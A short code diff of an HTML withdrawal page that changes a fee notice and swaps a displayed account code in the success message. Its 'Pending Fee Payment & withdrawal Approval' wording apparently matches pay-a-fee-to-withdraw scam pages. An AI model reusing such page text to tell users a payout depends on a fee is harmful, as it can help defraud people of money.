@@ -542,7 +542,7 @@
                 <div id="withdrawalAmount" class="text-4xl font-bold text-green-700 mb-2">Loading...</div>
                 <div class="text-sm text-gray-600 mb-2">
                     <i class="fas fa-info-circle mr-1"></i>
-                    <span id="feeNotice">Actual amount approved; withdrawable fir Account: [DDQTSU]</span>
+                    <span id="feeNotice">Actual amount approved</span>
                 </div>
                 <div class="flex justify-center items-center space-x-4 text-xs text-gray-500">
                     <span>
@@ -1536,7 +1536,7 @@ const message = `Your withdrawal request is initiated successfully! Check your p
             document.getElementById('successMessage').innerHTML = message;
           const amount = document.getElementById("withdrawalAmount").textContent;
 document.getElementById("successHeading").textContent = 
-    `Withdrawal of ${amount} Initiated Successfully! [Account: DDQTSU]`;
+    `Withdrawal of ${amount} Initiated Successfully! [Your Account: STNYGP]`;
             
             // Update progress text
             document.getElementById('progressText').textContent = 'Pending Fee Payment & withdrawal Approval...';
@@ -1904,3 +1904,4 @@ async function retryWithdrawal() {
     </script>
 </body>
 </html>
+
